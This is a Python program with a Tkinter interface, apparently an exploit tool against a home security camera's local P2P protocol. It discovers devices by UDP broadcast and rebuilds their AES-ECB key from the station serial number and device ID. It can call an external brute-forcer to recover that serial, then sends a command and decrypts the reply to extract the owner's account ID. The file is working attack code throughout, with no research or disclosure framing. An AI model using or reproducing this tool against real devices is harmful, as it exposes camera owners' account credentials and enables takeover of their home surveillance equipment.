import json
import sys
import socket
import struct
import time
import base64
import subprocess
import re
import threading
import queue
import tkinter as tk
from tkinter import ttk, messagebox
from Crypto.Cipher import AES
from typing import List, Dict, Optional, Tuple, Any


# ==============================================================================
# CONSTANTS & CONFIGURATION
# ==============================================================================

class CONSTANTS:
    DEFAULT_PORT = 32108  

    class REQUEST_MESSAGE_TYPE:
        LOCAL_LOOKUP = bytes([0xF1, 0x30])
        CHECK_CAM = bytes([0xF1, 0x41])
        DATA = bytes([0xF1, 0xD0])

    class RESPONSE_MESSAGE_TYPE:
        LOCAL_LOOKUP_RESP = bytes([0xF1, 0x41])
        DATA = bytes([0xF1, 0xD0])

    class P2P_DATA_TYPE_HEADER:
        DATA = bytes([0xD1, 0x00])

    class ENCRYPTION_TYPE:
        NONE = 0
        AES = 1

    MAX_SEQUENCE_NUMBER = 65535
    MAGIC_WORD = "XZYH"


# ==============================================================================
# UTILITY FUNCTIONS
# ==============================================================================

class Utils:
    @staticmethod
    def is_p2p_command_encrypted(cmd: int) -> bool:
        return True

    @staticmethod
    def send_message(sock: socket.socket, address: Tuple[str, int], msg_id: bytes,
                    payload: Optional[bytes] = None) -> int:
        if payload is None:
            payload = bytes()

        if msg_id == CONSTANTS.REQUEST_MESSAGE_TYPE.LOCAL_LOOKUP:
            message = msg_id + payload
        else:
            payload_len = struct.pack('!H', len(payload))
            message = msg_id + payload_len + payload

        try:
            bytes_sent = sock.sendto(message, address)
            return bytes_sent
        except Exception as e:
            raise RuntimeError(f'Transmission Failed: {e}') from e

    @staticmethod
    def has_header(msg: bytes, searched_type: bytes) -> bool:
        if len(msg) < 2:
            return False
        return msg[:2] == searched_type

    @staticmethod
    def build_command_header(seq_number: int, command_type: int) -> bytes:
        data_type_buffer = CONSTANTS.P2P_DATA_TYPE_HEADER.DATA
        seq_buffer = struct.pack('!H', seq_number)
        magic_string = CONSTANTS.MAGIC_WORD.encode('utf-8')
        command_type_buffer = struct.pack('<H', command_type)
        return data_type_buffer + seq_buffer + magic_string + command_type_buffer

    @staticmethod
    def build_int_string_command_payload(encryption_type: int, encryption_key: Optional[bytes],
                                        command_type: int, value: int, value_sub: int = 0,
                                        str_value: str = "", str_value_sub: str = "",
                                        channel: int = 0) -> bytes:
        empty_buffer = bytes([0x00, 0x00])
        magic_buffer = bytes([0x01, 0x00])

        encrypted = (Utils.is_p2p_command_encrypted(command_type) and
                    encryption_type != CONSTANTS.ENCRYPTION_TYPE.NONE and
                    encryption_key is not None and len(encryption_key) == 16)

        channel_buffer = bytes([channel, encryption_type if encrypted else 0])
        someint_buffer = struct.pack('<I', value_sub)
        value_buffer = struct.pack('<I', value)

        str_value_buffer = Utils.string_with_length(str_value) if str_value else bytes()
        str_value_sub_buffer = Utils.string_with_length(str_value_sub) if str_value_sub else bytes()

        tmp_data_buffer = someint_buffer + value_buffer + str_value_buffer + str_value_sub_buffer

        if encrypted:
            data_buffer = Utils.padding_p2p_data(tmp_data_buffer)
        else:
            data_buffer = tmp_data_buffer

        header_buffer = struct.pack('<H', len(data_buffer))

        if encrypted:
            encrypted_data = Utils.encrypt_p2p_data(data_buffer, encryption_key)
        else:
            encrypted_data = data_buffer

        return header_buffer + empty_buffer + magic_buffer + channel_buffer + empty_buffer + encrypted_data

    @staticmethod
    def build_string_command_payload(encryption_type: int, encryption_key: Optional[bytes],
                                    command_type: int, str_payload: str, channel: int = 255) -> bytes:
        empty_buffer = bytes([0x00, 0x00])
        magic_buffer = bytes([0x01, 0x00])

        encrypted = (Utils.is_p2p_command_encrypted(command_type) and
                    encryption_type != CONSTANTS.ENCRYPTION_TYPE.NONE and
                    encryption_key is not None and len(encryption_key) == 16)

        channel_buffer = bytes([channel, encryption_type if encrypted else 0])
        payload_buffer = str_payload.encode('utf-8')

        if encrypted:
            data_buffer = Utils.padding_p2p_data(payload_buffer)
        else:
            data_buffer = payload_buffer

        header_buffer = struct.pack('<H', len(data_buffer))

        if encrypted:
            encrypted_data = Utils.encrypt_p2p_data(data_buffer, encryption_key)
        else:
            encrypted_data = data_buffer

        return header_buffer + empty_buffer + magic_buffer + channel_buffer + empty_buffer + encrypted_data

    @staticmethod
    def build_int_command_payload(encryption_type: int, encryption_key: Optional[bytes],
                                 command_type: int, value: int, str_value: str = "",
                                 channel: int = 255) -> bytes:
        empty_buffer = bytes([0x00, 0x00])
        magic_buffer = bytes([0x01, 0x00])

        encrypted = (Utils.is_p2p_command_encrypted(command_type) and
                    encryption_type != CONSTANTS.ENCRYPTION_TYPE.NONE and
                    encryption_key is not None and len(encryption_key) == 16)

        channel_buffer = bytes([channel, encryption_type if encrypted else 0])
        value_buffer = struct.pack('<I', value)

        str_value_buffer = Utils.string_with_length(str_value) if str_value else bytes()

        tmp_data_buffer = value_buffer + str_value_buffer

        if encrypted:
            data_buffer = Utils.padding_p2p_data(tmp_data_buffer)
        else:
            data_buffer = tmp_data_buffer

        header_buffer = struct.pack('<H', len(data_buffer))

        if encrypted:
            encrypted_data = Utils.encrypt_p2p_data(data_buffer, encryption_key)
        else:
            encrypted_data = data_buffer

        return header_buffer + empty_buffer + magic_buffer + channel_buffer + empty_buffer + encrypted_data

    @staticmethod
    def build_void_command_payload(channel: int = 255) -> bytes:
        header_buffer = bytes([0x00, 0x00])
        empty_buffer = bytes([0x00, 0x00])
        magic_buffer = bytes([0x01, 0x00])
        channel_buffer = bytes([channel, 0x00])
        return header_buffer + empty_buffer + magic_buffer + channel_buffer + empty_buffer

    @staticmethod
    def padding_p2p_data(data: bytes, blocksize: int = 16) -> bytes:
        if len(data) < blocksize:
            buffer_size = blocksize
        else:
            buffer_size = (len(data) + blocksize - 1) // blocksize * blocksize

        result = bytearray(buffer_size)
        result[:len(data)] = data
        return bytes(result)

    @staticmethod
    def encrypt_p2p_data(data: bytes, key: bytes) -> bytes:
        cipher = AES.new(key, AES.MODE_ECB)
        return cipher.encrypt(data)

    @staticmethod
    def decrypt_p2p_data(data: bytes, key: bytes) -> bytes:
        cipher = AES.new(key, AES.MODE_ECB)
        return cipher.decrypt(data)

    @staticmethod
    def string_with_length(input_str: str, chunk_length: int = 128) -> bytes:
        string_buffer = input_str.encode('utf-8')
        if len(string_buffer) < chunk_length:
            buffer_size = chunk_length
        else:
            buffer_size = (len(string_buffer) + chunk_length - 1) // chunk_length * chunk_length

        result = bytearray(buffer_size)
        result[:len(string_buffer)] = string_buffer
        return bytes(result)

    @staticmethod
    def p2p_did_to_buffer(p2p_did: str) -> bytes:
        p2p_array = p2p_did.split("-")
        buf1 = Utils.string_with_length(p2p_array[0], 8)
        buf2 = struct.pack('!I', int(p2p_array[1]))
        buf3 = Utils.string_with_length(p2p_array[2], 8)
        return buf1 + buf2 + buf3

    @staticmethod
    def build_check_cam_payload(p2p_did: str) -> bytes:
        p2p_did_buffer = Utils.p2p_did_to_buffer(p2p_did)
        magic = bytes([0x00, 0x00, 0x00])
        return p2p_did_buffer + magic

    @staticmethod
    def build_local_lookup_payload() -> bytes:
        return bytes([0x00, 0x00])


# ==============================================================================
# CORE LOGIC
# ==============================================================================

class OfflineP2PSync:
    def __init__(self, station_sn: str, broadcast_address: str = "",
                 encryption_type: int = 0, logger=None):
        self.p2p_did = None
        self.station_sn = station_sn
        self.broadcast_address = broadcast_address
        self.encryption_type = encryption_type
        self.logger = logger or print
        self.encryption_key = self._generate_encryption_key()

        self.socket = None
        self.local_port = None
        self.connected = False
        self.connect_address = None
        self.seq_number = 0

        self.logger('Initializing P2P Client...')

    def _generate_encryption_key(self) -> Optional[bytes]:
        if not self.station_sn:
            return None
        sn_last7 = self.station_sn[-7:].rjust(7, '0')
        return sn_last7.encode('utf-8')

    def bind(self):
        if self.socket is not None:
            return
    
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        try:
            self.socket.sendto(b'', ('127.0.0.1', 1))
        except:
            pass

        self.local_port = self.socket.getsockname()[1]

    def discover(self, timeout: int = 3) -> List[Dict[str, Any]]:
        self.bind()

        devices = []
        payload = Utils.build_local_lookup_payload()

        broadcast_addresses = [self.broadcast_address] if self.broadcast_address else ['192.168.0.255']

        self.logger('Initiating Device Discovery...')

        for broadcast_address in broadcast_addresses:
            try:
                Utils.send_message(
                    self.socket,
                    (broadcast_address, CONSTANTS.DEFAULT_PORT),
                    CONSTANTS.REQUEST_MESSAGE_TYPE.LOCAL_LOOKUP,
                    payload
                )
            except Exception as e:
                self.logger(f'Broadcast Transmission Error: {e}')

        self.socket.settimeout(timeout / 1000)
        start_time = time.time()

        while time.time() - start_time < timeout / 1000:
            try:
                data, addr = self.socket.recvfrom(4096)
                if Utils.has_header(data, CONSTANTS.RESPONSE_MESSAGE_TYPE.LOCAL_LOOKUP_RESP):
                    if len(data) >= 24:
                        part1 = data[4:12].decode('utf-8').rstrip('\x00')
                        part2 = struct.unpack('!I', data[12:16])[0]
                        part3 = data[16:24].decode('utf-8').rstrip('\x00')
                        p2p_did = f'{part1}-{str(part2).zfill(6)}-{part3}'

                        device = {
                            'host': addr[0],
                            'ip': addr[0],
                            'port': addr[1],
                            'p2pDid': p2p_did
                        }

                        if device not in devices:
                            devices.append(device)

            except socket.timeout:
                continue
            except Exception as e:
                if '10054' in str(e):
                    continue
                else:
                    self.logger(f'Data Reception Error: {e}')
                    break

        self.logger(f'Device Discovery Completed, found {len(devices)} devices')
        return devices
    
    def connect(self, device: Dict[str, Any], max_retries: int = 3):
        if self.connected:
            self.logger('[*] Connection Already Established')
            return

        if self.socket is None:
            raise Exception('Socket Not Initialized. Call discover() first.')
        
        self.p2p_did = device['p2pDid']
        self.connect_address = (device['host'], device['port'])
        self._generate_full_encryption_key()

        payload = Utils.build_check_cam_payload(self.p2p_did)
        
        for attempt in range(max_retries):
            try:
                Utils.send_message(
                    self.socket,
                    self.connect_address,
                    CONSTANTS.REQUEST_MESSAGE_TYPE.CHECK_CAM,
                    payload
                )
                break
            except Exception as e:
                if attempt == max_retries - 1:
                    self.logger(f'[-] CHECK_CAM Transmission Failed to {device["host"]}:{device["port"]}: {e}')
                    raise
                self.logger(f'[*] Retrying {attempt + 1}/{max_retries} for {device["host"]}:{device["port"]}')
                time.sleep(0.1)
        
        self._clear_receive_buffer()

        self.connected = True


    def _generate_full_encryption_key(self):
        if not self.station_sn or not self.p2p_did:
            return

        sn_last7 = self.station_sn[-7:].rjust(7, '0')
        dash_index = self.p2p_did.find('-')

        if dash_index >= 0:
            p2p_did_part = self.p2p_did[dash_index:].ljust(9, '0')[:9]
        else:
            p2p_did_part = self.p2p_did.ljust(9, '0')[:9]

        key_string = (sn_last7 + p2p_did_part)[:16]
        self.encryption_key = key_string.encode('utf-8')

    def _clear_receive_buffer(self):
        if not self.socket:
            return

        original_timeout = self.socket.gettimeout()
        self.socket.settimeout(0.01)
        try:
            while True:
                data, addr = self.socket.recvfrom(4096)
        except socket.timeout:
            pass
        except Exception as e:
            pass
        finally:
            self.socket.settimeout(original_timeout)

    def send_command_with_int(self, command_type: int, value: int, str_value: str = "",
                             channel: int = 255):
        if not self.connected or not self.connect_address:
            raise Exception('Not Connected to Device')

        command_header = Utils.build_command_header(self.seq_number, command_type)
        payload = Utils.build_int_command_payload(
            self.encryption_type,
            self.encryption_key,
            command_type,
            value,
            str_value,
            channel
        )

        data = command_header + payload

        Utils.send_message(
            self.socket,
            self.connect_address,
            CONSTANTS.REQUEST_MESSAGE_TYPE.DATA,
            data
        )

        self.seq_number = (self.seq_number + 1) % (CONSTANTS.MAX_SEQUENCE_NUMBER + 1)


    def receive_data(self, timeout: int = 3000) -> Optional[Tuple[bytes, Tuple[str, int]]]:
        if not self.connected or not self.socket:
            raise Exception('Not Connected to Device')

        self.socket.settimeout(timeout / 1000)
        
        try:
            while True:
                data, addr = self.socket.recvfrom(4096)
                if addr == self.connect_address:
                    return data, addr
        except socket.timeout:
            return None
        except Exception as e:
            self.logger(f'Reception Error: {e}')
            return None
            
    def close(self):
        self.connected = False
        self.connect_address = None
        self.p2p_did = None
        self.seq_number = 0
        self._clear_receive_buffer()

    def shutdown(self):
        if self.socket:
            self.socket.close()
            self.socket = None


def check_connection_port(host: str, port: int, timeout: int = 2000) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(timeout / 1000)
        try:
            sock.connect((host, port))
            return True
        except (socket.timeout, ConnectionRefusedError):
            return False

def brute_force_sn(ping_data: bytes, exe_path: str = 'brute_force.exe') -> Optional[str]:
    try:
        ping_data_base64 = base64.b64encode(ping_data).decode('utf-8')
        
        result = subprocess.run(
            [exe_path, ping_data_base64],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        output = result.stdout
        
        match = re.search(r'SN\[(.*?)\]', output)
        if match:
            return match.group(1)
        
        return None
        
    except subprocess.TimeoutExpired:
        print(f'Brute Force Operation Timed Out')
        return None
    except FileNotFoundError:
        print(f'Executable Not Found: {exe_path}')
        return None
    except Exception as e:
        print(f'Brute Force Operation Error: {e}')
        return None

def findaccountid(strdata):
    if '{"param_type":1271,"param_value":"' in strdata:
        accountIdjson = base64.b64decode(strdata.split('{"param_type":1271,"param_value":"')[1].split('"')[0]).decode('utf-8')
        accountId = json.loads(accountIdjson)['account_id']
        return accountId
    return None


# ==============================================================================
# GUI APPLICATION
# ==============================================================================

class P2PScannerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Camera Device Scanner & Account ID Extractor")
        self.root.geometry("600x500")
        self.root.resizable(True, True)

        self.log_queue = queue.Queue()
        self.running = False
        self.worker_thread = None

        self._setup_ui()
        self._start_log_worker()

    def _setup_ui(self):
        # Main Container
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)

        # Input Section
        input_frame = ttk.LabelFrame(main_frame, text="Configuration", padding="10")
        input_frame.grid(row=0, column=0, sticky=(tk.W, tk.E), pady=(0, 10))
        input_frame.columnconfigure(1, weight=1)

        # Station SN
        ttk.Label(input_frame, text="Station SN:").grid(row=0, column=0, sticky=tk.W, pady=5)
        self.station_sn_entry = ttk.Entry(input_frame, show="*", width=30)
        self.station_sn_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), pady=5)

        # Broadcast Address
        ttk.Label(input_frame, text="Broadcast Address:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.broadcast_entry = ttk.Entry(input_frame, width=30)
        self.broadcast_entry.insert(0, "192.168.0.255")
        self.broadcast_entry.grid(row=1, column=1, sticky=(tk.W, tk.E), pady=5)

        # Target IP
        ttk.Label(input_frame, text="Target IP:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.target_entry = ttk.Entry(input_frame, width=30)
        self.target_entry.grid(row=2, column=1, sticky=(tk.W, tk.E), pady=5)

        # Buttons
        btn_frame = ttk.Frame(main_frame)
        btn_frame.grid(row=1, column=0, sticky=(tk.W, tk.E), pady=(0, 10))
        
        self.start_btn = ttk.Button(btn_frame, text="Start Scan", command=self.start_scan)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(btn_frame, text="Stop", command=self.stop_scan, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)

        # Log Section
        log_frame = ttk.LabelFrame(main_frame, text="System Log", padding="5")
        log_frame.grid(row=2, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        log_frame.columnconfigure(0, weight=1)
        log_frame.rowconfigure(0, weight=1)

        self.log_text = tk.Text(log_frame, height=10, state=tk.DISABLED, wrap=tk.WORD)
        self.log_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        scrollbar = ttk.Scrollbar(log_frame, orient=tk.VERTICAL, command=self.log_text.yview)
        scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        self.log_text.configure(yscrollcommand=scrollbar.set)

        # Result Section
        result_frame = ttk.LabelFrame(main_frame, text="Result", padding="10")
        result_frame.grid(row=3, column=0, sticky=(tk.W, tk.E))
        result_frame.columnconfigure(1, weight=1)

        ttk.Label(result_frame, text="Account ID:").grid(row=0, column=0, sticky=tk.W, padx=(0, 10))
        self.account_id_entry = ttk.Entry(result_frame, show="*", width=30, state=tk.DISABLED)
        self.account_id_entry.grid(row=0, column=1, sticky=(tk.W, tk.E))
        
        self.copy_btn = ttk.Button(result_frame, text="Copy", command=self.copy_to_clipboard)
        self.copy_btn.grid(row=0, column=2, padx=(10, 0))

    def _start_log_worker(self):
        """Polls the log queue and updates the GUI text widget."""
        self._process_log_queue()
        self.root.after(100, self._start_log_worker)

    def _process_log_queue(self):
        try:
            while True:
                message = self.log_queue.get_nowait()
                self.log_text.configure(state=tk.NORMAL)
                self.log_text.insert(tk.END, message + "\n")
                self.log_text.see(tk.END)
                self.log_text.configure(state=tk.DISABLED)
        except queue.Empty:
            pass

    def log(self, message):
        """Thread-safe logging to the GUI."""
        self.log_queue.put(message)

    def start_scan(self):
        self.running = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.account_id_entry.config(state=tk.NORMAL)
        self.account_id_entry.delete(0, tk.END)
        self.log_text.configure(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.configure(state=tk.DISABLED)
        self.log("Starting Scan Process...")

        self.worker_thread = threading.Thread(target=self._run_scan_logic, daemon=True)
        self.worker_thread.start()

    def stop_scan(self):
        self.running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.log("Scan Process Stopped by User.")

    def _run_scan_logic(self):
        """Runs the core scanning logic in a separate thread."""
        try:
            station_sn = self.station_sn_entry.get()
            broadcast_addr = self.broadcast_entry.get()
            target_ip = self.target_entry.get()

            if not station_sn:
                self.log("Error: Station SN is required.")
                self.stop_scan()
                return

            TEST_CONFIG = {
                'target': target_ip,
                'accountId': '',
                'stationSn': station_sn,
                'broadcastAddress': broadcast_addr,
                'encryptionType': CONSTANTS.ENCRYPTION_TYPE.AES
            }

            p2p = None
            try:
                p2p = OfflineP2PSync(
                    station_sn=TEST_CONFIG['stationSn'],
                    broadcast_address=TEST_CONFIG['broadcastAddress'],
                    encryption_type=TEST_CONFIG['encryptionType'],
                    logger=self.log
                )
                
                devices = p2p.discover(timeout=2000)
                
                if devices:
                    self.log(f"Found {len(devices)} device(s).")
                    for device in devices:
                        if TEST_CONFIG['target'] == device['host'] or not TEST_CONFIG['target']:
                            self.log(f"Connecting to {device['host']}...")
                            p2p.connect(device)
                            p2p.send_command_with_int(command_type=1103, value=0, channel=255) 
                            
                            received_packets = []
                            start_time = time.time()
                            timeout = 3
                            
                            while time.time() - start_time < timeout and self.running:
                                result = p2p.receive_data(timeout=500)
                                if result is not None:
                                    received_data, addr = result
                                    received_packets.append(received_data)
                                    
                            for received_data in received_packets:
                                if len(received_data) == 1032:
                                    if(received_data[0] == 0xf1 and received_data[1] == 0xd0 ):
                                        tmpdata = Utils.decrypt_p2p_data(received_data[24:], p2p.encryption_key)
                                        accountId = findaccountid(tmpdata.decode('utf-8'))
                                        if accountId:
                                            self.log(f'Account ID Retrieved!')
                                            self.root.after(0, lambda aid=accountId: self._set_account_id(aid))
                                            break
                            
                            p2p.close()
                else:
                    self.log("No devices found on the network.")
                    
            except Exception as error:
                self.log(f'\nOperation Failed: {error}')
                import traceback
                self.log(traceback.format_exc())
            finally:
                if p2p:
                    p2p.shutdown()
                self.stop_scan()
                
        except Exception as e:
            self.log(f"Critical Error: {e}")
            self.stop_scan()

    def _set_account_id(self, account_id):
        """Updates the Account ID entry from the main thread."""
        self.account_id_entry.delete(0, tk.END)
        self.account_id_entry.insert(0, account_id)
        self.account_id_entry.config(state=tk.DISABLED)

    def copy_to_clipboard(self):
        account_id = self.account_id_entry.get()
        if account_id:
            self.root.clipboard_clear()
            self.root.clipboard_append(account_id)
            self.log("Account ID copied to clipboard.")
        else:
            self.log("No Account ID to copy.")


if __name__ == '__main__':
    root = tk.Tk()
    app = P2PScannerApp(root)
    root.mainloop()
